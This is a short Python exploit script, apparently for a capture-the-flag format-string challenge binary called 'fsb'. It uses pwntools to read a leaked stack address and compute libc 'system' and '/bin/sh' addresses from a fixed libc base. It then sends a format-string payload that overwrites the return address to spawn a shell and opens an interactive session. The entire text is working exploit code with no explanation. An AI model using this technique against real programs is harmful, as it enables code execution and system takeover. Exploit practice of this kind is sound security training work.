#!/usr/bin/env python
from pwn import *

context.binary = './fsb'
context.terminal = ['tmux', 'splitw', '-h']

io = process("./fsb")

gdb.attach(io, """
br *0x40068a
""");
# gdb.attach(io)
io.recvuntil("[+] buf = ")
buf_addr = int(io.recvuntil("\n")[:-1],16)
log.info("buf_addr:"+hex(buf_addr))

libc_base =  0x7ffff7a0d000 
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

system_addr = libc_base+libc.symbols['system']
log.info("system_addr:"+hex(system_addr))
binsh_addr = libc_base+next(libc.search("/bin/sh"))
log.info("binsh_addr:"+hex(binsh_addr))


ret_addr = buf_addr+0xd8
log.info("ret_addr:"+hex(ret_addr))
argu1_addr = buf_addr+0xd8+0x8
log.info("argu1_addr:"+hex(argu1_addr))

#  0x45216,0x4526a ,0xf02a4,0xf1147
one_gadget_addr = libc_base + 0x45216
log.info("one_gadget_addr:"+hex(one_gadget_addr))
payload = fmtstr_payload(5,{ret_addr:system_addr,argu1_addr:binsh_addr},write_size = 'byte')
# payload = fmtstr_payload(5,{ret_addr:one_gadget_addr},write_size = 'byte')

# raw_input("Debug:")
io.send(payload)
io.recv()
io.interactive()
# buf       0x7fffffffdab0
# ret addr  0x7fffffffdb88 

# ret = buf +0xd8